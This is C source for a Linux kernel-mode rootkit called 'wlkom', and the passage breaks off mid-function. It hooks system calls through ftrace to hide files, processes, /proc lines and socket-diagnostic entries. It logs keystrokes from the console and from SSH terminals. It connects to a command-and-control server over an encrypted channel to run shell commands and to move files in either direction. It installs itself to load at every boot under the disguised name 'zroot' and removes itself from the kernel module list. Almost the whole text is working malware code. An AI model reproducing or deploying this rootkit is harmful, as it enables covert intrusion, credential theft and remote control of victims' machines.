#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <crypto/hash.h>
#include <net/sock.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/random.h>
#include <crypto/chacha20poly1305.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/file.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wlkom");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION("1.4");
MODULE_SOFTDEP("pre: libchacha20poly1305");

static char *pw_hash = "";
module_param(pw_hash, charp, 0400);
static char *c2_ip = "192.168.122.96";
static int c2_port = 9999;
module_param(c2_ip, charp, 0400);
module_param(c2_port, int, 0400);

static struct task_struct *c2_thread;
static int running = 1;
static struct socket *c2_sock = NULL;
static int authenticated = 0;
static struct list_head *prev_module;

/* ===== PROCESS HIDING ===== */
#define MAX_HIDDEN_PIDS 32
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);

/* ===== KEYLOGGER ===== */
#define KEYLOG_BUF_SIZE 4096
static char keylog_buf[KEYLOG_BUF_SIZE];
static int keylog_pos = 0;
static DEFINE_SPINLOCK(keylog_lock);
static int keylogger_active = 0;

/* TTY sniffer captures SSH + console input via read hook */
/* keyboard_notifier captures physical console input as backup */

/* ===== CHACHA20-POLY1305 CRYPTO ===== */

#define CRYPTO_TAG_SIZE  CHACHA20POLY1305_AUTHTAG_SIZE  /* 16 */
#define CRYPTO_NONCE_SIZE 8
#define CRYPTO_HDR_SIZE  (4 + CRYPTO_NONCE_SIZE) /* len + nonce */

static u8 crypto_key[CHACHA20POLY1305_KEY_SIZE];
static u64 send_nonce_ctr = 0;
static int crypto_ready = 0;

/* ===== FTRACE HOOK INFRASTRUCTURE ===== */

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static unsigned long wlkom_ksym(const char *n)
{
    struct kprobe kp = { .symbol_name = n };
    unsigned long a;
    if (register_kprobe(&kp) < 0) return 0;
    a = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return a;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    hook->address = wlkom_ksym(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "wlkom: symbol %s not found\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "wlkom: ftrace_set_filter_ip(%s) = %d\n",
               hook->name, err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        printk(KERN_ERR "wlkom: register_ftrace(%s) = %d\n",
               hook->name, err);
        return err;
    }
    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    if (!hook->address) return;
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

/* ===== HIDE FILES (getdents64 via ftrace) ===== */

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t real_getdents64 = NULL;

static int is_hidden_pid(const char *name)
{
    long pid_val;
    int i;
    unsigned long flags;

    /* Check if name is numeric (PID in /proc) */
    if (name[0] < '1' || name[0] > '9')
        return 0;
    if (kstrtol(name, 10, &pid_val) != 0)
        return 0;

    spin_lock_irqsave(&pid_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == (pid_t)pid_val) {
            spin_unlock_irqrestore(&pid_lock, flags);
            return 1;
        }
    }
    spin_unlock_irqrestore(&pid_lock, flags);
    return 0;
}

static asmlinkage long hk_getdents64(const struct pt_regs *regs)
{
    long ret = real_getdents64(regs);
    struct linux_dirent64 __user *ud = (void *)regs->si;
    struct linux_dirent64 *kd, *c;
    unsigned long off = 0;
    long nr;

    if (ret <= 0) return ret;
    kd = kmalloc(ret, GFP_KERNEL);
    if (!kd) return ret;
    if (copy_from_user(kd, ud, ret)) { kfree(kd); return ret; }
    nr = ret;
    while (off < nr) {
        c = (void *)kd + off;
        if (strstr(c->d_name, "wlkom") != NULL ||
            strstr(c->d_name, "zroot") != NULL ||
            is_hidden_pid(c->d_name)) {
            long r = nr - off - c->d_reclen;
            if (r > 0) memmove(c, (char *)c + c->d_reclen, r);
            nr -= c->d_reclen;
        } else { off += c->d_reclen; }
    }
    if (copy_to_user(ud, kd, nr)) {}
    kfree(kd);
    return nr;
}

static struct ftrace_hook getdents64_hook = {
    .name     = "__x64_sys_getdents64",
    .function = hk_getdents64,
    .original = &real_getdents64,
};

static int hide_files_active = 0;

static void hide_files_init(void)
{
    if (fh_install_hook(&getdents64_hook) == 0) {
        hide_files_active = 1;
        printk(KERN_INFO "wlkom: hide files active (ftrace)\n");
    }
}

static void hide_files_exit(void)
{
    if (hide_files_active) {
        fh_remove_hook(&getdents64_hook);
        hide_files_active = 0;
    }
}

/* ===== NETWORK HIDING (forward declarations) ===== */
static char c2_port_hex[8];
static char c2_ip_hex[16];
static int net_hide_ready = 0;

/* ===== HIDE FILE LINES (read hook via ftrace) ===== */

typedef asmlinkage long (*orig_read_t)(const struct pt_regs *);
static orig_read_t real_read = NULL;

static asmlinkage long hk_read(const struct pt_regs *regs)
{
    long ret;
    char __user *ubuf;
    char *kbuf, *src, *dst, *end, *nl;
    long new_len;

    ret = real_read(regs);
    if (ret <= 0)
        return ret;

    ubuf = (char __user *)regs->si;

    /* === TTY SNIFFER: capture SSH + console input === */
    if (keylogger_active && ret > 0 && ret <= 64) {
        unsigned int fd = (unsigned int)regs->di;
        struct file *f = fget(fd);
        if (f) {
            struct inode *ino = file_inode(f);
            if (S_ISCHR(ino->i_mode)) {
                unsigned int maj = imajor(ino);
                /* major 4 = /dev/ttyN, 136 = /dev/pts/N (SSH PTY) */
                if (maj == 4 || maj == 136) {
                    char tmp[64];
                    if (!copy_from_user(tmp, ubuf, ret)) {
                        unsigned long flags;
                        int i;
                        spin_lock_irqsave(&keylog_lock, flags);
                        for (i = 0; i < ret; i++) {
                            if (keylog_pos >= KEYLOG_BUF_SIZE - 2) {
                                keylog_pos = 0; /* ring buffer wrap */
                            }
                            if (tmp[i] >= 0x20 && tmp[i] < 0x7f)
                                keylog_buf[keylog_pos++] = tmp[i];
                            else if (tmp[i] == '\r' || tmp[i] == '\n')
                                keylog_buf[keylog_pos++] = '\n';
                            else if (tmp[i] == 0x7f || tmp[i] == 0x08) {
                                if (keylog_pos > 0) keylog_pos--;
                            }
                        }
                        keylog_buf[keylog_pos] = '\0';
                        spin_unlock_irqrestore(&keylog_lock, flags);
                    }
                }
            }
            fput(f);
        }
    }

    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, ubuf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    /* Check if content needs filtering */
    {
        int has_wlkom = (strnstr(kbuf, "wlkom", ret) != NULL ||
                         strnstr(kbuf, "zroot", ret) != NULL);
        int has_net = (net_hide_ready && strnstr(kbuf, c2_port_hex, ret) != NULL);
        if (!has_wlkom && !has_net) {
            kfree(kbuf);
            return ret;
        }
    }

    /* Filter out lines containing "wlkom" or C2 connection */
    src = kbuf;
    dst = kbuf;
    end = kbuf + ret;

    while (src < end) {
        nl = memchr(src, '\n', end - src);
        if (nl) {
            long line_len = nl - src + 1;
            int hide = 0;
            if (strnstr(src, "wlkom", line_len) ||
                strnstr(src, "zroot", line_len))
                hide = 1;
            if (!hide && net_hide_ready &&
                strnstr(src, c2_port_hex, line_len) &&
                strnstr(src, c2_ip_hex, line_len))
                hide = 1;
            if (!hide) {
                memmove(dst, src, line_len);
                dst += line_len;
            }
            src = nl + 1;
        } else {
            long line_len = end - src;
            int hide = 0;
            if (strnstr(src, "wlkom", line_len) ||
                strnstr(src, "zroot", line_len))
                hide = 1;
            if (!hide && net_hide_ready &&
                strnstr(src, c2_port_hex, line_len) &&
                strnstr(src, c2_ip_hex, line_len))
                hide = 1;
            if (!hide) {
                memmove(dst, src, line_len);
                dst += line_len;
            }
            break;
        }
    }

    new_len = dst - kbuf;
    if (new_len != ret) {
        if (copy_to_user(ubuf, kbuf, new_len)) {
            kfree(kbuf);
            return ret;
        }
    }
    kfree(kbuf);
    return new_len;
}

static struct ftrace_hook read_hook = {
    .name     = "__x64_sys_read",
    .function = hk_read,
    .original = &real_read,
};

static int hide_lines_active = 0;

static void hide_lines_init(void)
{
    if (fh_install_hook(&read_hook) == 0) {
        hide_lines_active = 1;
        printk(KERN_INFO "wlkom: hide lines active (ftrace)\n");
    }
}

static void hide_lines_exit(void)
{
    if (hide_lines_active) {
        fh_remove_hook(&read_hook);
        hide_lines_active = 0;
    }
}

/* ===== NETWORK CONNECTION HIDING ===== */
/*
 * C2 port 9999 = 0x270F. In /proc/net/tcp, ports are hex.
 * Local port appears at column 2 after ":", e.g. " 0100007F:270F"
 * We also hide remote port. The read hook already filters "wlkom" lines.
 * We extend it to also filter lines containing our C2 port hex.
 */

static void net_hide_init(void)
{
    u32 ip_addr;
    /* Convert port to uppercase hex (matches /proc/net/tcp format) */
    snprintf(c2_port_hex, sizeof(c2_port_hex), "%04X", c2_port);
    /* Convert IP to hex format used in /proc/net/tcp (little-endian) */
    ip_addr = in_aton(c2_ip);
    snprintf(c2_ip_hex, sizeof(c2_ip_hex), "%08X", ip_addr);
    net_hide_ready = 1;
    printk(KERN_INFO "wlkom: net hiding ready (port=%s ip=%s)\n",
           c2_port_hex, c2_ip_hex);
}

/* ===== HIDE SS OUTPUT (recvmsg hook for NETLINK_SOCK_DIAG) ===== */

typedef asmlinkage long (*orig_recvmsg_t)(const struct pt_regs *);
static orig_recvmsg_t real_recvmsg = NULL;

static asmlinkage long hk_recvmsg(const struct pt_regs *regs)
{
    long ret;
    unsigned int fd;
    struct file *f;
    struct socket *sock;
    struct sock *sk;
    struct iovec iov;
    char __user *ubuf;
    unsigned long ulen;
    char *kbuf;
    struct nlmsghdr *nlh;
    unsigned int offset, new_len;

    ret = real_recvmsg(regs);
    if (ret <= 0 || !net_hide_ready)
        return ret;

    fd = (unsigned int)regs->di;
    f = fget(fd);
    if (!f)
        return ret;

    sock = sock_from_file(f);
    if (!sock || !sock->sk) {
        fput(f);
        return ret;
    }
    sk = sock->sk;
    if (sk->sk_family != AF_NETLINK) {
        fput(f);
        return ret;
    }
    if (sk->sk_protocol != NETLINK_SOCK_DIAG) {
        fput(f);
        return ret;
    }
    fput(f);

    {
        struct user_msghdr __user *umsg = (void __user *)regs->si;
        struct iovec __user *uiov;
        if (get_user(uiov, &umsg->msg_iov))
            return ret;
        if (copy_from_user(&iov, uiov, sizeof(iov)))
            return ret;
    }

    ubuf = iov.iov_base;
    ulen = iov.iov_len;
    if ((unsigned long)ret > ulen)
        return ret;

    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;
    if (copy_from_user(kbuf, ubuf, ret)) {
        kfree(kbuf);
        return ret;
    }

    offset = 0;
    new_len = 0;
    while (offset < (unsigned int)ret) {
        nlh = (struct nlmsghdr *)(kbuf + offset);
        if (offset + sizeof(*nlh) > (unsigned int)ret ||
            nlh->nlmsg_len < sizeof(*nlh) ||
            offset + NLMSG_ALIGN(nlh->nlmsg_len) > (unsigned int)ret + NLMSG_ALIGNTO)
            break;

        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
            struct inet_diag_msg *idm = NLMSG_DATA(nlh);
            __be16 port = htons((u16)c2_port);
            if (idm->id.idiag_sport == port ||
                idm->id.idiag_dport == port) {
                offset += NLMSG_ALIGN(nlh->nlmsg_len);
                continue;
            }
        }

        if (new_len != offset)
            memmove(kbuf + new_len, kbuf + offset,
                    NLMSG_ALIGN(nlh->nlmsg_len));
        new_len += NLMSG_ALIGN(nlh->nlmsg_len);
        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    if (new_len != (unsigned int)ret) {
        if (copy_to_user(ubuf, kbuf, new_len)) {
            kfree(kbuf);
            return ret;
        }
        kfree(kbuf);
        return (long)new_len;
    }

    kfree(kbuf);
    return ret;
}

static struct ftrace_hook recvmsg_hook = {
    .name     = "__x64_sys_recvmsg",
    .function = hk_recvmsg,
    .original = &real_recvmsg,
};

static int hide_ss_active = 0;

static void hide_ss_init(void)
{
    if (fh_install_hook(&recvmsg_hook) == 0) {
        hide_ss_active = 1;
        printk(KERN_INFO "wlkom: ss hiding active (recvmsg hook)\n");
    }
}

static void hide_ss_exit(void)
{
    if (hide_ss_active) {
        fh_remove_hook(&recvmsg_hook);
        hide_ss_active = 0;
    }
}

/* ===== KEYLOGGER ===== */

static int keylog_notify(struct notifier_block *nb, unsigned long code, void *data)
{
    struct keyboard_notifier_param *param = data;
    unsigned long flags;
    char c;

    /* KBD_KEYSYM: value is the keysym (ASCII for printable chars) */
    if (code != KBD_KEYSYM || !param->down)
        return NOTIFY_OK;

    if (param->value >= 0x20 && param->value < 0x7f)
        c = (char)param->value;
    else if (param->value == 0x0d || param->value == 0x0a)
        c = '\n';
    else
        return NOTIFY_OK;

    spin_lock_irqsave(&keylog_lock, flags);
    if (keylog_pos >= KEYLOG_BUF_SIZE - 2)
        keylog_pos = 0;
    keylog_buf[keylog_pos++] = c;
    keylog_buf[keylog_pos] = '\0';
    spin_unlock_irqrestore(&keylog_lock, flags);
    return NOTIFY_OK;
}

static struct notifier_block keylog_nb = {
    .notifier_call = keylog_notify,
};

static void keylogger_start(void)
{
    if (keylogger_active)
        return;
    register_keyboard_notifier(&keylog_nb);
    keylogger_active = 1;
    printk(KERN_INFO "wlkom: keylogger started\n");
}

static void keylogger_stop(void)
{
    if (!keylogger_active)
        return;
    unregister_keyboard_notifier(&keylog_nb);
    keylogger_active = 0;
    printk(KERN_INFO "wlkom: keylogger stopped\n");
}

static int keylog_dump(char *out, int max_len)
{
    unsigned long flags;
    int len;

    spin_lock_irqsave(&keylog_lock, flags);
    len = keylog_pos;
    if (len > max_len - 1) len = max_len - 1;
    memcpy(out, keylog_buf, len);
    out[len] = '\0';
    keylog_pos = 0; /* Clear after read */
    spin_unlock_irqrestore(&keylog_lock, flags);
    return len;
}

/* ===== NETWORK (TCP) ===== */

static int raw_send_all(const char *data, int len)
{
    struct kvec vec;
    struct msghdr mh;
    int sent = 0, ret;
    if (!c2_sock || len <= 0) return -1;
    while (sent < len) {
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = (void *)(data + sent);
        vec.iov_len  = len - sent;
        ret = kernel_sendmsg(c2_sock, &mh, &vec, 1, len - sent);
        if (ret <= 0) return ret;
        sent += ret;
    }
    return sent;
}

static int raw_recv_all(char *buf, int len)
{
    struct kvec vec;
    struct msghdr mh;
    int got = 0, ret, tries = 0;
    if (!c2_sock || len <= 0) return -1;
    while (got < len && tries < 500) {
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = buf + got;
        vec.iov_len  = len - got;
        ret = kernel_recvmsg(c2_sock, &mh, &vec, 1, len - got, MSG_DONTWAIT);
        if (ret > 0) { got += ret; tries = 0; }
        else if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(10); tries++; }
        else return ret;
    }
    return got == len ? len : -1;
}

static int send_msg(const char *msg, int len)
{
    u8 *frame;
    u32 net_len;
    u64 nonce;
    int total, ret;

    if (!c2_sock || len <= 0) return -1;

    if (!crypto_ready)
        return raw_send_all(msg, len);

    /* Frame: [4B payload_len BE][8B nonce LE][ciphertext + 16B tag] */
    total = CRYPTO_HDR_SIZE + len + CRYPTO_TAG_SIZE;
    frame = kmalloc(total, GFP_KERNEL);
    if (!frame) return -ENOMEM;

    nonce = send_nonce_ctr++;
    net_len = htonl(CRYPTO_NONCE_SIZE + len + CRYPTO_TAG_SIZE);

    memcpy(frame, &net_len, 4);
    memcpy(frame + 4, &nonce, 8);
    chacha20poly1305_encrypt(frame + CRYPTO_HDR_SIZE,
                             (const u8 *)msg, len,
                             NULL, 0, nonce, crypto_key);

    ret = raw_send_all((char *)frame, total);
    kfree(frame);
    return ret > 0 ? len : ret;
}

static int recv_msg_nb(char *buf, int size)
{
    struct kvec vec;
    struct msghdr mh;
    u8 hdr[4];
    u32 payload_len;
    u64 nonce;
    u8 *payload;
    int ret;
    size_t ct_len, pt_len;

    if (!c2_sock) return -1;

    if (!crypto_ready) {
        memset(&mh, 0, sizeof(mh));
        memset(buf, 0, size);
        vec.iov_base = buf;
        vec.iov_len  = size - 1;
        return kernel_recvmsg(c2_sock, &mh, &vec, 1, size - 1, MSG_DONTWAIT);
    }

    /* Peek for 4-byte header */
    memset(&mh, 0, sizeof(mh));
    vec.iov_base = hdr;
    vec.iov_len  = 4;
    ret = kernel_recvmsg(c2_sock, &mh, &vec, 1, 4, MSG_DONTWAIT | MSG_PEEK);
    if (ret == 0) return 0; /* connection closed */
    if (ret < 0) return ret; /* -EAGAIN or error */
    if (ret < 4) {
        /* Partial header (1-3 bytes) likely means FIN received (CLOSE-WAIT) */
        /* Drain the bytes and signal disconnect */
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = hdr;
        vec.iov_len  = ret;
        kernel_recvmsg(c2_sock, &mh, &vec, 1, ret, 0);
        return 0;
    }

    /* Read header for real */
    ret = raw_recv_all((char *)hdr, 4);
    if (ret != 4) return -1;

    memcpy(&payload_len, hdr, 4);
    payload_len = ntohl(payload_len);
    if (payload_len < CRYPTO_NONCE_SIZE + CRYPTO_TAG_SIZE || payload_len > 65536)
        return -1;

    payload = kmalloc(payload_len, GFP_KERNEL);
    if (!payload) return -ENOMEM;

    ret = raw_recv_all((char *)payload, payload_len);
    if (ret != (int)payload_len) { kfree(payload); return -1; }

    memcpy(&nonce, payload, 8);
    ct_len = payload_len - CRYPTO_NONCE_SIZE;
    pt_len = ct_len - CRYPTO_TAG_SIZE;

    if (pt_len > (size_t)(size - 1)) { kfree(payload); return -1; }

    if (!chacha20poly1305_decrypt((u8 *)buf, payload + CRYPTO_NONCE_SIZE,
                                  ct_len, NULL, 0, nonce, crypto_key)) {
        kfree(payload);
        printk(KERN_ERR "wlkom: decrypt failed\n");
        return -1;
    }

    buf[pt_len] = '\0';
    kfree(payload);
    return (int)pt_len;
}

static int connect_to_c2(void)
{
    struct sockaddr_in addr;
    int ret;
    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                           IPPROTO_TCP, &c2_sock);
    if (ret < 0) { c2_sock = NULL; return ret; }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(c2_port);
    addr.sin_addr.s_addr = in_aton(c2_ip);
    ret = kernel_connect(c2_sock, (struct sockaddr *)&addr,
                         sizeof(addr), 0);
    if (ret < 0) { sock_release(c2_sock); c2_sock = NULL; return ret; }
    printk(KERN_INFO "wlkom: connected to C2\n");
    return 0;
}

/* ===== SHA256 ===== */

static int compute_sha256(const char *data, size_t len, u8 *out)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    int ret;
    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) return PTR_ERR(tfm);
    desc = kmalloc(sizeof(*desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
    if (!desc) { crypto_free_shash(tfm); return -ENOMEM; }
    desc->tfm = tfm;
    ret = crypto_shash_digest(desc, data, len, out);
    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

static void bin2hex_str(const u8 *bin, size_t len, char *hex)
{
    static const char h[] = "0123456789abcdef";
    size_t i;
    for (i = 0; i < len; i++) {
        hex[i*2]   = h[bin[i] >> 4];
        hex[i*2+1] = h[bin[i] & 0xf];
    }
    hex[len*2] = '\0';
}

static int check_password(const char *pwd)
{
    u8 hash[32];
    char hex[65];
    if (!pw_hash || strlen(pw_hash) == 0) return 1;
    if (compute_sha256(pwd, strlen(pwd), hash) < 0) return 0;
    bin2hex_str(hash, sizeof(hash), hex);
    return strcmp(hex, pw_hash) == 0;
}

static void crypto_derive_key(void)
{
    char seed[128];
    int len;

    len = snprintf(seed, sizeof(seed), "wlkom_crypto_%s", pw_hash);
    if (compute_sha256(seed, len, crypto_key) == 0) {
        crypto_ready = 1;
        printk(KERN_INFO "wlkom: crypto ready (chacha20-poly1305)\n");
    } else {
        printk(KERN_ERR "wlkom: crypto key derivation failed\n");
    }
}

/* ===== EXEC ===== */

static int exec_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/root",
                     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                     "TERM=xterm",
                     "LANG=C",
                     NULL };
    char full_cmd[1024];
    struct file *f;
    char *buf;
    char *out;
    loff_t pos = 0;
    ssize_t bytes;
    long total = 0;
    int tries;
    #define MAX_OUTPUT (60 * 1024)

    argv[2] = "rm -f /tmp/.wlkom_out /tmp/.wlkom_done";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    snprintf(full_cmd, sizeof(full_cmd),
             "%s > /tmp/.wlkom_out 2>&1; touch /tmp/.wlkom_done",
             cmd);
    argv[2] = full_cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);

    for (tries = 0; tries < 60; tries++) {
        msleep(500);
        f = filp_open("/tmp/.wlkom_done", O_RDONLY, 0);
        if (!IS_ERR(f)) {
            filp_close(f, NULL);
            break;
        }
    }

    f = filp_open("/tmp/.wlkom_out", O_RDONLY, 0);
    if (IS_ERR(f)) { send_msg("(no output)\n", 12); goto cleanup; }

    out = vmalloc(MAX_OUTPUT);
    if (!out) { filp_close(f, NULL); goto cleanup; }

    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { vfree(out); filp_close(f, NULL); goto cleanup; }

    pos = 0;
    total = 0;
    while (total < MAX_OUTPUT - 1) {
        bytes = kernel_read(f, buf, 4095, &pos);
        if (bytes <= 0)
            break;
        if (total + bytes >= MAX_OUTPUT)
            bytes = MAX_OUTPUT - 1 - total;
        memcpy(out + total, buf, bytes);
        total += bytes;
    }
    kfree(buf);
    filp_close(f, NULL);

    if (total > 0) {
        out[total] = '\0';
        send_msg(out, total);
    } else {
        send_msg("(no output)\n", 12);
    }
    vfree(out);

cleanup:
    argv[2] = "rm -f /tmp/.wlkom_out /tmp/.wlkom_done";
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    return 0;
    #undef MAX_OUTPUT
}

/* ===== DOWNLOAD ===== */

static int do_download(const char *path)
{
    struct file *f;
    char *buf;
    char header[256];
    loff_t pos = 0;
    ssize_t bytes;
    loff_t size;

    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) { send_msg("ERR:not found\n", 14); return -1; }
    size = i_size_read(file_inode(f));
    snprintf(header, sizeof(header), "FILE:%s:%lld\n", path, (long long)size);
    send_msg(header, strlen(header));
    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }
    while ((bytes = kernel_read(f, buf, 4096, &pos)) > 0)
        send_msg(buf, bytes);
    send_msg("EOF\n", 4);
    kfree(buf);
    filp_close(f, NULL);
    return 0;
}

/* ===== UPLOAD ===== */

static int do_upload(const char *path)
{
    struct file *f;
    char *buf;
    char size_buf[64];
    int ret, tries;
    loff_t pos = 0;
    long long total = 0, received = 0;

    tries = 0;
    ret = -EAGAIN;
    while ((ret == -EAGAIN || ret == -EWOULDBLOCK) && tries < 100) {
        ret = recv_msg_nb(size_buf, sizeof(size_buf));
        if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(50); tries++; }
    }
    if (ret <= 0) return -1;
    size_buf[ret] = 0;
    if (ret > 0 && size_buf[ret-1] == '\n') size_buf[ret-1] = 0;
    if (kstrtoll(size_buf, 10, &total) < 0) return -1;

    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f)) { send_msg("ERR:create\n", 11); return -1; }
    send_msg("READY\n", 6);

    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }

    while (received < total) {
        tries = 0;
        ret = -EAGAIN;
        while ((ret == -EAGAIN || ret == -EWOULDBLOCK) && tries < 200) {
            ret = recv_msg_nb(buf, 4096);
            if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(50); tries++; }
        }
        if (ret <= 0) break;
        kernel_write(f, buf, ret, &pos);
        received += ret;
    }
    kfree(buf);
    filp_close(f, NULL);
    send_msg("UPLOAD_OK\n", 10);
    return 0;
}

/* ===== PERSISTENCE ===== */

static void set_persistence(void)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     NULL };
    char cmd[512];

    /* Copy module to kernel modules dir as zroot (stealth name) */
    argv[2] = "mkdir -p /lib/modules/$(uname -r)/extra && "
              "cp /root/wlkom/rootkit/wlkom.ko "
              "/lib/modules/$(uname -r)/extra/zroot.ko && depmod -a";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* Auto-load on boot via modules-load.d */
    argv[2] = "echo zroot > /etc/modules-load.d/zroot.conf";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* Module parameters for modprobe */
    snprintf(cmd, sizeof(cmd),
        "echo 'options zroot pw_hash=%s c2_ip=%s c2_port=%d' "
        "> /etc/modprobe.d/zroot.conf",
        pw_hash, c2_ip, c2_port);
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    printk(KERN_INFO "wlkom: persistence set\n");
}

/* ===== HIDE MODULE ===== */

static void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    printk(KERN_INFO "wlkom: module hidden\n");
}

/* ===== C2 THREAD ===== */

static int c2_thread_fn(void *data)
{
    char buf[512];
    int ret;

    ssleep(2);
    set_persistence();
    hide_module();
    hide_files_init();
    hide_lines_init();
    crypto_derive_key();
    net_hide_init();
    hide_ss_init();
    keylogger_start();

    /* Auto-hide our own kthread PID */
    {
        unsigned long flags;
        spin_lock_irqsave(&pid_lock, flags);
        if (hidden_pid_count < MAX_HIDDEN_PIDS)
            hidden_pids[hidden_pid_count++] = current->pid;
        spin_unlock_irqrestore(&pid_lock, flags);
        printk(KERN_INFO "wlkom: kthread PID %d auto-hidden\n", current->pid);
    }

    printk(KERN_INFO "wlkom: C2 thread started\n");

    while (running && !kthread_should_stop()) {

        if (!c2_sock) {
            authenticated = 0;
            send_nonce_ctr = 0;
            if (connect_to_c2() < 0) { ssleep(5); continue; }
            send_msg("AUTH_REQUIRED\n", 14);
        }

        ret = recv_msg_nb(buf, sizeof(buf));

        if (ret == -EAGAIN || ret == -EWOULDBLOCK) {
            msleep(200);
            continue;
        }

        if (ret <= 0) {
            sock_release(c2_sock);
            c2_sock = NULL;
            authenticated = 0;
            ssleep(5);
            continue;
        }

        if (buf[ret-1] == '\n') buf[ret-1] = '\0';

        if (!authenticated) {
            if (check_password(buf)) {
                authenticated = 1;
                send_msg("AUTH_OK\n", 8);
                printk(KERN_INFO "wlkom: authenticated\n");
            } else {
                send_msg("AUTH_FAIL\n", 10);
                sock_release(c2_sock);
                c2_sock = NULL;
                ssleep(5);
            }
            continue;
        }

        if (strncmp(buf, "DOWNLOAD:", 9) == 0) {
            do_download(buf + 9);
        } else if (strncmp(buf, "UPLOAD:", 7) == 0) {
            do_upload(buf + 7);
        } else if (strncmp(buf, "HIDE_PID:", 9) == 0) {
            long pid_val;
            if (kstrtol(buf + 9, 10, &pid_val) == 0) {
                unsigned long flags;
                spin_lock_irqsave(&pid_lock, flags);
                if (hidden_pid_count < MAX_HIDDEN_PIDS) {
                    hidden_pids[hidden_pid_count++] = (pid_t)pid_val;
                    spin_unlock_irqrestore(&pid_lock, flags);
                    send_msg("PID_HIDDEN\n", 11);
                } else {
                    spin_unlock_irqrestore(&pid_lock, flags);
                    send_msg("ERR:max_pids\n", 13);
                }
            } else {
                send_msg("ERR:bad_pid\n", 12);
            }
        } else if (strncmp(buf, "UNHIDE_PID:", 11) == 0) {
            long pid_val;
            if (kstrtol(buf + 11, 10, &pid_val) == 0) {
                unsigned long flags;
                int i, found = 0;
                spin_lock_irqsave(&pid_lock, flags);
                for (i = 0; i < hidden_pid_count; i++) {
                    if (hidden_pids[i] == (pid_t)pid_val) {
                        hidden_pids[i] = hidden_pids[--hidden_pid_count];
                        found = 1;
                        break;
                    }
                }
